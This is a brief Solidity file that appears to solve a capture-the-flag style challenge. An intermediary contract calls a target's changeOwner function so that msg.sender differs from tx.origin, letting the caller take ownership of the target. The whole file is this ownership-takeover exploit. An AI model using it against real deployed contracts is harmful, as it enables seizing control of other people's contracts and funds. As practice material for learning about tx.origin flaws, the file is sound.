// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

interface Tele {
    function changeOwner(address _owner) external;
}

contract Telephone {
  function callChangeOwner(address _owner, address callerContract) public {
    Tele(callerContract).changeOwner(_owner);
  }
}
